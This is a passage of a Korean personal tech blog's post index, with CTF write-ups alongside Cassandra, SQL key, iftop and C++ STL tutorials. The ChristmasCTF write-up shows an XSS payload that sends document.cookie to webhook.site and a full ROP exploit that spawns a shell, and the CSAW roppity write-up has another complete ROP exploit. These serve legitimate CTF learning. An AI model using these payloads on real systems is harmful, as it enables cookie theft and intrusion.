있었다는 메일을 받아볼 수 있었고, 뿌듯함과 동시에 열심히 해야겠다는 생각도 많이 들었다. 앞으로의 계획 취업 자격증 취득 &amp;&amp; 개인 공부 건강(헬스 등..) 큰 분류로 3개 나눠봤다우선 순위이자 계획이고 하나하나 열심히 준비해서 2021년에는 좀 더 성실한 사람이 되야겠다.","categories":[{"name":"Memo","slug":"Memo","permalink":"https://blog.jhyeon.dev/categories/Memo/"}],"tags":[{"name":"회고","slug":"회고","permalink":"https://blog.jhyeon.dev/tags/%ED%9A%8C%EA%B3%A0/"}]},{"title":"시스템 OS 개념 및 기초","slug":"systemos-210101","date":"2020-12-31T15:00:00.000Z","updated":"2020-12-31T15:00:00.000Z","comments":true,"path":"2021/01/01/systemos-210101/","link":"","permalink":"https://blog.jhyeon.dev/2021/01/01/systemos-210101/","excerpt":"","text":"해당 포스트는 노션으로 이전되었습니다. https://www.notion.so/jhyeon/OS-Basic-8ab6955b2060478fa2a7846d128f7490","categories":[{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"}],"tags":[{"name":"System","slug":"System","permalink":"https://blog.jhyeon.dev/tags/System/"},{"name":"OS","slug":"OS","permalink":"https://blog.jhyeon.dev/tags/OS/"},{"name":"syscall","slug":"syscall","permalink":"https://blog.jhyeon.dev/tags/syscall/"}]},{"title":"웹 해킹 기법 기초","slug":"webhacking-210101","date":"2020-12-31T15:00:00.000Z","updated":"2020-12-31T15:00:00.000Z","comments":true,"path":"2021/01/01/webhacking-210101/","link":"","permalink":"https://blog.jhyeon.dev/2021/01/01/webhacking-210101/","excerpt":"","text":"해당 포스트는 노션으로 이전되었습니다. https://www.notion.so/jhyeon/Web-Hacking-Basic-1b7c7cb3dfe44feeae9e48dc17486ff0","categories":[{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"},{"name":"Web Hacking","slug":"Web-Hacking","permalink":"https://blog.jhyeon.dev/tags/Web-Hacking/"}]},{"title":"ChristmasCTF 2019 Write up","slug":"christmasctf-201226","date":"2020-12-25T15:00:00.000Z","updated":"2020-12-25T15:00:00.000Z","comments":true,"path":"2020/12/26/christmasctf-201226/","link":"","permalink":"https://blog.jhyeon.dev/2020/12/26/christmasctf-201226/","excerpt":"","text":"1. [Web] watermelon이 문제는 언인텐 풀이로 푼 것 같다. 문제 내에서 로그인 계정 중 admin 계정에 대해서 비밀번호가 admin 과 같이 세팅되어 있음을 알 수 있었고, 이를 통해 로그인 하여 플래그를 얻어낼 수 있었다. 2. [Web] JWTjwt: &#123; bruth: &#123; key: &#39;********&#39;, // 0~9, 8 length options: &#123; issuer: &#39;c2w2m2&#39;, expiresIn: &#39;1d&#39;, algorithm: &#39;HS256&#39;, &#125; &#125;; 해당 문제는 PHP JWT TOKEN 를 사용하는 문제이다. config.js 에서 위와 같은 내용을 확인할 수 있었고 결론적으로 secret key를 브포해서 찾아내야 하는 것이였다. 그래서 해당 범위 내 숫자로 구성해서 브포를 돌려서 토큰의 secret key를 얻었고, payload 부분에 있는 is_admin 항목을 true로 변조한 뒤 다시 인코딩하여 쿠키를 바꿔줌으로써 플래그를 얻었다. 참고 : john the ripeer(https://www.openwall.com/john/) 3. [Web] CSRF해당 문제는 CSRF(Cross-site-Request-Forgery) 취약점을 사용한 문제이다. 문제에 보면 게시글을 쓸 수 있는 공간이 있고, 해당 로직을 처리하는 부분의 코드를 분석했을 때 다음과 같은 사실을 알 수 있다. if (board.content.match(/script|img|on/i)) return res.send(&#123; code: 400 &#125;); 무려 내용 작성에 대해서만 필터링을 걸고 제목에는 없다.. 그래서 이를 이용해서 제목에 페이로드를 넣었다. location.href=&#39;https://webhook.site~&#39; + document.cookie; 4. [Pwn] Solo testROP 기법을 이용해서 풀면 된다. #!/usr/bin/python from pwn import * p = process(&#39;./solo_test&#39;) e = ELF(&#39;./solo_test&#39;) libc = ELF(&#39;./libc227.so&#39;) pr = 0x0000000000400b83 ret = 0x00000000004005f1 puts_plt = e.plt[&#39;puts&#39;] puts_got = e.got[&#39;puts&#39;] solo = e.symbols[&#39;solo&#39;] puts_offset = libc.symbols[&#39;puts&#39;] system_offset = libc.symbols[&#39;system&#39;] binsh_offset = next(libc.search(&quot;/bin/sh&quot;)) p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;Me&#39;) p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;No&#39;) p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;CTF&#39;) p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;Never&#39;) p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;No&#39;) payload = &quot;A&quot;*88 payload += p64(pr) payload += p64(puts_got) payload += p64(puts_plt) payload += p64(solo) p.sendlineafter(&#39;--&gt; &#39;,payload) puts_addr = u64(p.recv(6).ljust(8,&quot;\\x00&quot;)) libc_base = puts_addr - puts_offset system_addr = libc_base + system_offset binsh_addr = libc_base + binsh_offset payload = &quot;A&quot;*88 payload += p64(pr) payload += p64(binsh_addr) payload += p64(ret) payload += p64(system_addr) p.sendlineafter(&#39;--&gt; &#39;, payload) p.interactive() p.close()","categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/categories/CTF/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"},{"name":"Pwnable","slug":"Pwnable","permalink":"https://blog.jhyeon.dev/tags/Pwnable/"},{"name":"ChristmasCTF2019","slug":"ChristmasCTF2019","permalink":"https://blog.jhyeon.dev/tags/ChristmasCTF2019/"}]},{"title":"BISC CTF 2020(oldschool) write up","slug":"bob-bisc-201129","date":"2020-11-20T15:00:00.000Z","updated":"2020-11-20T15:00:00.000Z","comments":true,"path":"2020/11/21/bob-bisc-201129/","link":"","permalink":"https://blog.jhyeon.dev/2020/11/21/bob-bisc-201129/","excerpt":"","text":"사실 풀고나니 꽤나 쉬웠던 것 같은 문제인데, 요즘 시스템쪽을 하는둥 마는둥 하다보니 익스코드 짜는데 오래 걸려버려서 대회 중에는 인증을 못해봤었다.. (틈틈히 챙겨야 할듯) https://www.notion.so/jhyeon/BISC-2020-oldschool-write-up-7b4dc57cf9834eab9f1260adf1b609f5","categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/categories/CTF/"}],"tags":[{"name":"BISC2020","slug":"BISC2020","permalink":"https://blog.jhyeon.dev/tags/BISC2020/"},{"name":"Pwnable","slug":"Pwnable","permalink":"https://blog.jhyeon.dev/tags/Pwnable/"},{"name":"ROP","slug":"ROP","permalink":"https://blog.jhyeon.dev/tags/ROP/"}]},{"title":"POX(Power of xx) 2020 Write up","slug":"poxctf-201121","date":"2020-11-20T15:00:00.000Z","updated":"2020-11-20T15:00:00.000Z","comments":true,"path":"2020/11/21/poxctf-201121/","link":"","permalink":"https://blog.jhyeon.dev/2020/11/21/poxctf-201121/","excerpt":"","text":"POX 2020 출제자 Write up 자료입니다. 아래 노션에서 풀이를 확인하실 수 있습니다. 질문 사항이 있으시면 &#x73;&#x74;&#106;&#x68;&#x79;&#x65;&#111;&#x6e;&#x40;&#x6b;&#97;&#x6b;&#x61;&#x6f;&#46;&#99;&#111;&#109; 으로 메일을 보내주세요! https://www.notion.so/jhyeon/POX-2020-Write-Up-300e65d33b6c4dd185d886cd2e7a6417","categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/categories/CTF/"}],"tags":[{"name":"POX2020","slug":"POX2020","permalink":"https://blog.jhyeon.dev/tags/POX2020/"}]},{"title":"NoSQL - Cassandra Engine","slug":"cassandra-200925","date":"2020-09-24T15:00:00.000Z","updated":"2020-09-24T15:00:00.000Z","comments":true,"path":"2020/09/25/cassandra-200925/","link":"","permalink":"https://blog.jhyeon.dev/2020/09/25/cassandra-200925/","excerpt":"","text":"CassandraCassandra란?Cassandra(Free-Open Source Distributed NoSQL Database) 는 분산형 오픈소스 NoSQL Database이며, 단일 장애점(Single Point of Failure, SPOF) 없이 고성능을 제공하며 많은 서버들간에 대용량 데이터를 관리하기 위해 설계되었습니다. Cassandra는 여러 데이터 센터(Data Center)에 걸쳐 Cluster를 지원하고 있으며 대용량의 데이터, 구조화, 비정형 데이터를 관리하는데 적합합니다. Cassandra의 장점 및 단점장점 : Consistent Hashing 구조를 이용한 Ring구조와 Gossip Protocol을 구현하였기 때문에, 각 노드의 장비추가, 제거 등이 자유롭고 데이터 센터까지 고려할 수 있는 데이터 복제 정책을 사용하고 있어 안정성 측면에서 많은 장점을 가지고 있습니다. Cassandra를 이용하면 Sharing, Master-Slave와 같은 정책 없이도 장애 대응이 가능하며 장비를 늘리고 줄이는 것에 큰 비용이 들지 않습니다. 단점 : Cassandra는 테이블 간 Join이나 Transaction을 지원하지 않고, Index 등의 검색을 위한 기능도 매우 단출하며, Cassandra의 구조상 RDBMS와 같은 페이징(Paging)을 구현하는 것이 어렵고 Keyspace, Table을 과도하게 생성할 경우 메모리 오버플로우가 발생할 수 있습니다. Cassandra Data Structure Cassandra의 데이터 구조는 다음 사진과 같습니다. Keyspace -&gt; Table -&gt; Row key -&gt; Column(Name, Value)로 구성되어 있습니다. 이 때 Keyspace와 Table에 대한 정보는 모든 Cassandra Node의 Memory에 저장되며 실제 데이터가 저장되는 Row는 각 Row-key를 가지고, Hash(token)을 기준으로 각 노드에 분산 저장되어있습니다. 그리고 Row에 속하는 Column은 Column Name을 기준으로 정렬되어 저장됩니다. Cassandra Column, Super ColumnCassandra의 컬럼과 슈퍼컬럼 두 컬럼 모두 Name, Value로 이루어진 튜플형입니다. 이 두 컬럼의 차이점은 문자열(String)과 Map 형태의 차이점입니다. 즉, 슈퍼컬럼의 값에는 다양한 형태의 데이터 타입을 가질 수 있습니다. Cassandra 설치 https://cassandra.apache.org/download/ Cassandra 예제Cassandra CQL Shell에 접속하는 방법은 다음과 같습니다. (Debian/Ubuntu 기준) $ cqlsh 이 때, 사용자 인증을 거치지않고 쉘에 접속하게 되는데 보안 설정을 위해서는 다음과 같이 설정합니다. $ sudo vi /etc/cassandra/cassandra.yaml (104 Lines) authenticator: PasswordAuthenticator # AllowAllAuthenticator 주석 처리 후 변경 이후 CQL Shell에 접속하기 위해서는 다음과 같은 명령어로 접속합니다. $ cqlsh -u cassandra -p cassandra # 기본 계정 하지만 위와 같은 방법도 기본 계정으로 설정되어 있기 때문에 새로운 유저를 추가해서 사용하는 방식으로 변경합니다. cassandra@cqlsh&gt; create user username with password &#39;password&#39; superuser; cassandra@cqlsh&gt; exit $ cqlsh -u username -p password cassandra@cqlsh&gt; drop user cassandra; cassandra@cqlsh&gt; LIST USERS; /* 생성된 계정 확인 */ 이제 Cassandra에 대한 기본적인 보안을 거쳐 사용하실 수 있습니다! 새로운 Keyspace 생성username@cqlsh&gt; create keyspace keyspace_name with replication = &#123;&#39;class&#39;: &#39;SimpleStrategy&#39;, &#39;replication_factor&#39;: 3&#125;; username@cqlsh&gt; desc keyspaces; /* 생성된 keyspace 확인 */ Replication이란 Keyspace를 생성할때 Replication의 복제 개수, 위치를 결정할 수 있는데 옵션은 아래와 같습니다. SimpleStrategy 옵션은 단일 데이터 센터일 경우 사용하는 옵션이며, 멀티 데이터 센터를 사용할 경우 NetworkTopologyStrategy 를 사용하면 됩니다. 또, replication_factor란 동일한 데이터의 사본(복사본)을 수신할 클러스터의 시스템 수를 의미합니다. 새로운 Table 생성username@cqlsh&gt; use keyspace_name; /* 이전에 만든 keyspace로 접속 */ username@cqlsh:keyspace_name&gt; create table test.test_table(idx int, name text, context text); /* 테이블 생성 */ username@cqlsh:keyspace_name&gt; desc test.test_table; 생성한 Table에 데이터 삽입username@cqlsh:keyspace_name&gt; insert into test.test_table (idx, name, context) values (1, &#39;bob&#39;, &#39;bobgood&#39;); /* 데이터 삽입 */ username@cqlsh:keyspace_name&gt; select * from test.test_table; /* 테이블의 모든 행 조회 */ References https://meetup.toast.com/search?searchText=Cassandra http://www.incodom.kr/Cassandra_%EC%A0%95%EC%9D%98 https://newly0513.tistory.com/37","categories":[{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"}],"tags":[{"name":"NoSQL","slug":"NoSQL","permalink":"https://blog.jhyeon.dev/tags/NoSQL/"},{"name":"Cassandra","slug":"Cassandra","permalink":"https://blog.jhyeon.dev/tags/Cassandra/"}]},{"title":"DB Primary Key, Foreign Key","slug":"db-key-200924","date":"2020-09-23T15:00:00.000Z","updated":"2020-09-23T15:00:00.000Z","comments":true,"path":"2020/09/24/db-key-200924/","link":"","permalink":"https://blog.jhyeon.dev/2020/09/24/db-key-200924/","excerpt":"","text":"SQL 제약조건 Not Null 데이터에 Null 값이 들어갈 수 없다. Unique 데이터에 중복되는 값이 들어갈 수 없다. Primary Key(PK) 각 행 또는 레코드를 고유하게 식별하는 값 (1+2 제약조건 포함) Foreign Key(FK) 다른 테이블의 레코드를 참조하여 무결성을 검사한다. Check 데이터의 범위 또는 사용자 조건을 지정한다. PK(Primary Key)란?데이터베이스 테이블에서 각 행 또는 레코드를 고유하게 식별하는 테이블의 필드를 의미합니다. 기본 키(PK)는 반드시 고유한 값을 가지며, 기본 키로 설정된 열은 NULL(빈 값)을 가질 수 없습니다. 또, 하나의 테이블에는 반드시 하나의 기본 키(PK)만을 구성할 수 있습니다. (추가) 중복 항목이 입력되지 않기 위해서 PK를 사용하는데 제약조건으로는 여러 개를 추가할 수 없지만, 테이블을 만들 때 다중 PK를 지정하게 되면 생성이 가능하고 지정한 모든 PK 컬럼에는 중복 데이터가 들어갈 수 없습니다. PK(Primary Key) 생성 예제create table test( userid varchar(25) not null, username varchar(5) not null, age int(3) not null, primary key(userid) ); create table test( userid varchar(25) not null, username varchar(5) not null, age int(3) not null, primary key(userid, username) ); 다음과 같이 test 테이블을 생성하고 userid의 속성을 기본 키(PK)로 지정하기 위한 예제입니다. 이 때, PK로 지정하고자 하는 컬럼은 반드시 “not null”의 제약조건을 가지고 있어야합니다. (추가) 2번째 예시는 다중 복합키로 테이블을 구성할 떄의 예시입니다. FK(Foreign Key)란?테이블의 특정 행 또는 레코드를 서로 연결시켜주는 것을 외래키(Foreign Key)라고 부르고, RDBMS(Relation Database Management System)에서 명시적으로 테이블을 연결해주는 장치를 의미합니다. 예를 들어서 사용자로부터 주문을 받고 처리하기까지의 과정이 있다고 가정하면, 고객 정보를 저장하는 테이블, 주문을 처리하는 테이블 두개로 나누어서 보자. 그럼 고객이 특정 상품에 대해서 주문을 했을 때 주문을 처리하는 테이블로 고객의 정보와 함께 어떤 상품인지에 대한 정보가 기록될 것 이고, 여기서 주문을 한 사용자 정보를 고객 테이블에서 외래키로 참조하여 가져온다면 주문 테이블에 있는 고객들은, 실제 고객 정보 테이블에 존재하는 사용자라고 볼 수 있으며 무결성이 검증된다는 의미이다. FK(Foreign Key) 생성 예제create table Customer_TB( id varchar(25) not null, name varchar(5) not null, age int(3) not null, phone varchar(15) not null, address varchar(20) not null, primary key(id) ); create table Order_TB( order_num int(11) not null auto_increment, customer_id varchar(25) not null, order_date datetime not null, order_amount int(4) not null, primary key(order_num), foreign key(customer_id) references Customer_TB(id) ON UPDATE CASCADE ON DELETE CASCADE ); 두 예졔를 보면 위에서 간단한 예시로 설명을 했듯이 똑같이 SQL 구문으로 작성한 것이다. 여기서 ON UPDATE, ON DELETE 라는 옵션이 있는데 해당 옵션은 외래키(Foreign Key)의 제약조건에 의해 참조되는 테이블에서 수정, 삭제가 일어날 때 참조하고 있는 테이블도 시스템에서 자동으로 데이터에 대한 수정, 삭제를 수행함을 의미합니다. CASCADE : 참조되는 테이블에서 데이터를 삭제하거나 수정하면, 참조하는 테이블에서도 삭제와 수정이 같이 이루어집니다. SET NULL : 참조되는 테이블에서 데이터를 삭제하거나 수정하면, 참조하는 테이블의 데이터는 NULL로 변경됩니다. NO ACTION : 참조되는 테이블에서 데이터를 삭제하거나 수정해도, 참조하는 테이블의 데이터는 변경되지 않습니다. SET DEFAULT : 참조되는 테이블에서 데이터를 삭제하거나 수정하면, 참조하는 테이블의 데이터는 필드의 기본값으로 설정됩니다. RESTRICT : 참조하는 테이블에 데이터가 남아 있으면, 참조되는 테이블의 데이터를 삭제하거나 수정할 수 없습니다. References http://www.tcpschool.com/mysql/mysql_constraint_foreignKey","categories":[{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"}],"tags":[{"name":"DB","slug":"DB","permalink":"https://blog.jhyeon.dev/tags/DB/"},{"name":"Primary Key","slug":"Primary-Key","permalink":"https://blog.jhyeon.dev/tags/Primary-Key/"},{"name":"Foreign Key","slug":"Foreign-Key","permalink":"https://blog.jhyeon.dev/tags/Foreign-Key/"}]},{"title":"Linux[iftop] Example","slug":"linux-iftop-200917","date":"2020-09-16T15:00:00.000Z","updated":"2020-09-16T15:00:00.000Z","comments":true,"path":"2020/09/17/linux-iftop-200917/","link":"","permalink":"https://blog.jhyeon.dev/2020/09/17/linux-iftop-200917/","excerpt":"","text":"Install$ sudo apt-get install libpcap-dev $ sudo apt-get install iftop Command$ sudo iftop # 라이브로 모니터링 하기 때문에 root 권한이 필요하다. 별도의 옵션 없이 실행했을때는 네트워크의 최상단 인터페이스를 기준으로 실시간 모니터링을 수행한다. 첫번째 라인은 서버의 호스트, 두번째 라인은 대상 호스트 네임(IP 주소), 세번째 라인은 패킷의 전송량을 표시해준다. 또한 하단의 TX, RX, TOTAL 정보들은 각각 전송량, 수신량, 총 송/수신량을 의미한다. 그리고 -f(filter) 옵션을 통해 특정 조건에 해당하는 네트워크 패킷만을 보여주는 옵션이 있다. pcap-filter 형식의 문자열로 보면되고, 필터 옵션들은 다음과 같다. $ man pcap-filter $ sudo iftop -f &quot;src host 127.0.0.1&quot; $ sudo iftop -f &quot;dst host 8.8.8.8&quot; 주로 사용될만한 것들을 정리하면 다음과 같다. 자세한 것은 manpage에 보면 상세히 나와있다! pcap-filterdst host hostname 목적지 호스트네임(IP주소)src host hostname 출발지 호스트네임(IP주소)dst port port 목적지 포트src port port 출발지 포트ip proto protocol 프로토콜 유형ether dst ehost 이더넷 목적지 주소가 ehost인지 체크ether src ehost 이더넷 출발지 주소가 ehost인지 체크ether host ehost 이더넷 출발지 또는 목적지 주소가 ehost인지 체크gateway hostname 게이트웨이 호스트네임(IP주소) interactive-moden DNS Resolution on/offs Source Host Hide/UnHided Destination Host Hide/UnHidet Cycle LineN Port Resolution on/offS Port Display(SRC) on/offD Port Display(DST) on/offp Port Display on/off&lt; Sort by Source| Sort by Destinationo | Order by frozen/unfrozenP | Pause Displayh | helpb | bar on/offB | bar show 2/10/40(s) averageT | cumulative totals show/hidej,k | scroll displayf | net-filterl | screen-filterL | lin/log scales! | shell command(default: disabled)q | quit","categories":[{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://blog.jhyeon.dev/tags/Linux/"},{"name":"iftop","slug":"iftop","permalink":"https://blog.jhyeon.dev/tags/iftop/"}]},{"title":"CSAW CTF 2020 roppity Write up","slug":"csawctf-200914","date":"2020-09-13T15:00:00.000Z","updated":"2020-09-13T15:00:00.000Z","comments":true,"path":"2020/09/14/csawctf-200914/","link":"","permalink":"https://blog.jhyeon.dev/2020/09/14/csawctf-200914/","excerpt":"","text":"개요DEMON 소속팀에서 팀원분들과 CTF를 나가게 되었습니다~~ 오랜만에 CTF를 봐서 그런지 감이 안잡히는 문제들도 많아서 많이 헤멨는데 조금 더 분발해야겠네요 ㅜ_ㅜ 앞으로 시간될때마다 팀원분들과 같이 CTF 참여해서 글 자주 포스팅 할 예정입니다 :) roppity(analysis)먼저 문제에서 주어지는 파일은 바이너리와 libc 파일입니다. 64bit 환경에서 컴파일 되었고 Memory Mitigation은 별 다른거 없이 NX BIT만 활성화 되어있습니다. IDA로 넘어가서 조금 더 딥하게 분석해봅시다. 메인 함수 안에서 작동하는 매우 간단한 원리의 바이너리 인것을 확인할 수 있습니다. 여기서 공격 벡터로 사용할 수 있는 함수는 puts 함수인데, 해당 함수의 실제 주소를 leak 해서 rop 해주면 끝납니다! 필요한 부분들을 하나씩 찾아봅시다. 일단 입력값이 저장되는 v4 버퍼의 크기는 rbp-20(32byte) 입니다. 그리고 함수 릭을 할려면 plt, got 값을 각각 구해야하는데 gdb를 통해서 볼수도 있지만 pwntools를 이용하면 시간 절약이 가능합니다. #!/usr/bin/python3 from pwn import * p = remote(&#39;pwn.chal.csaw.io&#39;,5016) e = ELF(&#39;./rop&#39;) puts_plt = e.plt[&#39;puts&#39;] puts_got = e.got[&#39;puts&#39;] 이런식으로 하면 puts 함수의 plt, got를 각각 구할 수 있습니다. 함수 오프셋도 똑같이 libc 파일을 불러와서 symbols로 구해주면 되니깐 이하 생략하겠습니다~ 그리고 rop에서 중요한 부분은 함수 릭을 할때 함수의 인자를 정리해줘야 해서 pop gadget 필요한데 이것도 ROPgadget 도구를 이용하면 쉽게 구합니다. puts 함수의 인자를 정리해줄려면 pop ret로 해주면 되기 때문에 pop rdi ret 가젯을 사용하면 됩니다. 그럼 이제 함수 릭까지의 익스코드를 정리해보면 아래와 같습니다 payload = &quot;A&quot;*40 # 32byte + 8 payload += p64(pr) payload += p64(puts_got) payload += p64(puts_plt) payload += p64(main) p.sendlineafter(&quot;\\n&quot;, payload) puts_addr = u64(p.recv(6).ljust(8,&quot;\\x00&quot;)) print(hex(puts_addr)) 아까 구했던 값들을 그대로 이용해서 함수릭을 해주면 됩니다. 중간에 main symbols을 구해서 마지막에 리턴해주는 이유는 함수 leak을 하고 다시 main 함수로 리턴해서 초기의 상태로 만들어서 공격을 수행해야 하는 간단한 이유입니다. 이제 남은 일은 libc base, system, binsh의 주소를 구해서 sh을 실행시켜주면 끝납니다. 오프셋 계산은 매우 간단합니다. libc base 주소를 구해서 그냥 offset를 더해주면 필요한 함수의 주소가 나옵니다. libc_base = puts_addr - puts_offset system_addr = libc_base + system_offset binsh_addr = libc_base + binsh_offset exploit#!/usr/bin/python3 from pwn import * p = remote(&#39;pwn.chal.csaw.io&#39;,5016) e = ELF(&#39;./rop&#39;) libc = ELF(&#39;./libc-2.27.so&#39;) pr = 0x0000000000400683 # pop rdi ret ret = 0x000000000040048e # ret puts_plt = e.plt[&#39;puts&#39;] puts_got = e.got[&#39;puts&#39;] main = e.symbols[&#39;main&#39;] puts_offset = libc.symbols[&#39;puts&#39;] system_offset = libc.symbols[&#39;system&#39;] binsh_offset = next(libc.search(&quot;/bin/sh&quot;)) payload = &quot;A&quot;*40 # 32byte + 8 payload += p64(pr) payload += p64(puts_got) payload += p64(puts_plt) payload += p64(main) p.sendlineafter(&quot;\\n&quot;, payload) puts_addr = u64(p.recv(6).ljust(8,&quot;\\x00&quot;)) libc_base = puts_addr - puts_offset system_addr = libc_base + system_offset binsh_addr = libc_base + binsh_offset payload = &quot;A&quot;*40 payload += p64(pr) payload += p64(binsh_addr) payload += p64(ret) payload += p64(system_addr) p.sendline(payload) p.interactive() p.close()","categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/categories/CTF/"}],"tags":[{"name":"Pwnable","slug":"Pwnable","permalink":"https://blog.jhyeon.dev/tags/Pwnable/"},{"name":"ROP","slug":"ROP","permalink":"https://blog.jhyeon.dev/tags/ROP/"},{"name":"CSAWCTF 2020","slug":"CSAWCTF-2020","permalink":"https://blog.jhyeon.dev/tags/CSAWCTF-2020/"}]},{"title":"PicoCTF 2019 Write Up","slug":"picoctf-200911","date":"2020-09-10T15:00:00.000Z","updated":"2020-09-10T15:00:00.000Z","comments":true,"path":"2020/09/11/picoctf-200911/","link":"","permalink":"https://blog.jhyeon.dev/2020/09/11/picoctf-200911/","excerpt":"","text":"해당 포스트 내용은 노션으로 이전되었습니다. https://www.notion.so/jhyeon/PicoCTF-2019-Write-up-358b3f86917443398fa9df9932df5320","categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/categories/CTF/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"},{"name":"Pwnable","slug":"Pwnable","permalink":"https://blog.jhyeon.dev/tags/Pwnable/"},{"name":"PicoCTF2019","slug":"PicoCTF2019","permalink":"https://blog.jhyeon.dev/tags/PicoCTF2019/"}]},{"title":"C++ STL(Standard Template Library)","slug":"c-stl-200910","date":"2020-09-09T15:00:00.000Z","updated":"2020-09-09T15:00:00.000Z","comments":true,"path":"2020/09/10/c-stl-200910/","link":"","permalink":"https://blog.jhyeon.dev/2020/09/10/c-stl-200910/","excerpt":"","text":"list(linked list)list는 순서를 유지하는 구조로 이루어진 노드 기반 컨테이너입니다. 원소가 노드 단위로 저장되며, list는 이중 연결 리스트(double linked list)이고 임의 접근이 불가능하고 순차적으로 접근만 허용됩니다. 허용 연산자(“==”, “!=”, “&lt;” “&gt;” “&lt;=” “&gt;=”) list 선언list it - 빈 컨테이너 리스트 생성list lt(n) - 기본값으로 초기화 된 n개위 원소를 가지는 리스트list lt(n,m) - m으로 초기화 된 n개의 원소를 가지는 리스트list lt(lt2) - lt2의 복사본인 lt 리스트 #include &lt;link&gt; // library using namespace std; list 생성자 예제#include &lt;cstdio&gt; #include &lt;iostream&gt; #include &lt;list&gt; using namespace std; int main(void)&#123; list&lt;int&gt; lt1; list&lt;int&gt; lt2(100); list&lt;int&gt; lt3(100, 5); list&lt;int&gt; lt4(lt1); cout &lt;&lt; &quot;lt1 size&quot; &lt;&lt; lt1.size() &lt;&lt; &#39;\\n&#39;; // 0 cout &lt;&lt; &quot;lt2 size&quot; &lt;&lt; lt2.size() &lt;&lt; &#39;\\n&#39;; // 100 cout &lt;&lt; &quot;lt3 size&quot; &lt;&lt; lt3.size() &lt;&lt; &quot;\\n&quot;; // 100 cout &lt;&lt; &quot;lt4 size&quot; &lt;&lt; lt4.size() &lt;&lt; &quot;\\n&quot;; // lt1 == 0 &#125; list 멤버 함수|Name|Contextlt.front()| 맨 앞의 원소를 반환 및 참조한다.lt.back() | 맨 뒤의 원소를 반환 및 참조한다.lt.begin() | 맨 앞의 원소를 가리키는 iterator를 반환한다.lt.end() | 맨 마지막의 다음 원소를 가리키는 iterator를 반환한다.lt.rbegin()| 뒤에서부터 원소를 순차적으로 접근할 때 사용한다. (뒤집었을 때 첫번째)lt.rend() | 뒤에서부터 원소를 순차적으로 접근할 떄 사용한다. (뒤집었을 떄 마지막)lt.push_front(k) | 앞쪽으로 원소 k를 삽입한다.lt.push_back(k) | 뒤쪽으로 원소 k를 삽입한다.lt.pop_front() | 맨 첫번째 원소를 제거한다.lt_pop_back() | 맨 마지막 원소를 제거한다.lt.insert(iter, k) | iter가 가리키는 위치에 원소 k를 삽입하고 iterator를 반환한다.lt.erase() | iterator가 가리키는 원소를 삭제하고, 반환값은 삭제한 원소의 다음 원소를 가리키는 iterator를 반환한다.lt.size() | 원소의 개수를 반환한다.lt.remove(k) | k와 같은 원소를 모두 삭제한다.lt.remove_if(Predicate) | 단항 조건자 Predicate에 해당하는 원소를 모두 삭제한다.lt.reverse() | 원소들의 순차열을 뒤집는다.lt.sort() | 모든 원소를 오름차순으로 정렬하고, 파라미터가 오는 경우에는 파라미터를 기준으로 정렬한다.lt.empty() | 리스트가 비어있으면 true를 반환하고 아닌 경우 false를 반환한다.lt2.swap(lt) | lt와 lt2를 바꾼다.lt2.splice(iter2, lt) | li2에서 iter2가 가리키는 lt의 모든 원소를 잘라서 붙인다.lt2.unique() | 인접한 원소가 같으면 유일하게 만든다.lt2.merge(lt) | lt를 lt2의 내부로 합병 정렬을 한다(기본 : 오름차순 정렬), 두번쨰 파라미터로 정렬 기준을 받을 수도 있다. list 사용 예제#include &lt;cstdio&gt; #include &lt;iostream&gt; #include &lt;list&gt; using namespace std; int main(void)&#123; list&lt;int&gt; ltlist; list&lt;int&gt;::iterator lt; list&lt;int&gt;::iterator lter = ltlist.begin(); // auto begin list&lt;int&gt;::iterator lter2 = ltlist.end(); // auto end ltlist.push_back(10); // 뒤쪽으로 10(원소 k) 삽입 ltlist.push_back(11); // 뒤쪽으로 11(원소 k) 삽입 cout &lt;&lt; ltlist.front() &lt;&lt; &quot;\\n&quot;; // 맨 앞 원소를 반환 및 참조 cout &lt;&lt; ltlist.back() &lt;&lt; &quot;\\n&quot;; // 맨 뒤 원소를 반환 및 참조 ltlist.push_front(1); // 앞쪽으로 1(원소 k) 삽입 ltlist.push_back(12); // 뒤쪽으로 12(원소 k) 삽입 ltlist.pop_front(); // 맨 앞쪽의 원소를 제거 == 1이 삭제되겠지? ltlist.pop_back(); // 맨 뒤쪽의 원소를 제거 == 12가 삭제되겠지? cout &lt;&lt; ltlist.size() &lt;&lt; &quot;\\n&quot;; // 리스트의 크기를 반환 lter++; // 리스트 위치 +1 ltlist.insert(lter, 3); // 리스트의 두번째 위치에 3을 삽입 lter2--; ltlist.erase(lter2); // 마지막 원소를 가리키는 iterator의 원소를 삭제 ltlist.remove(10); // 10과 같은 원소 모두 삭제 ltlist.reverse(); // 순차열 뒤집기 ltlist.sort(); // 오름차순 정렬 cout &lt;&lt; (ltlist.empty() ? &quot;true&quot;: &quot;false&quot;) &lt;&lt; &quot;\\n&quot;; // 리스트가 비어있는지 체크(삼항 연산자 사용) for(lt = ltlist.begin(); lt != ltlist.end(); lt++)&#123; //iterator 반복문 출력 시작 cout &lt;&lt; *lt &lt;&lt; endl; &#125; &#125; vectorSTL의 sequence container의 하나인 vector는 자동으로 메모리가 할당되는 배열이다. 스택과 비슷한 개념이라고 할 수 있고, 중간에 값을 넣거나 삭제할 수 있다. 허용 연산자(“==”, “!=”, “&lt;” 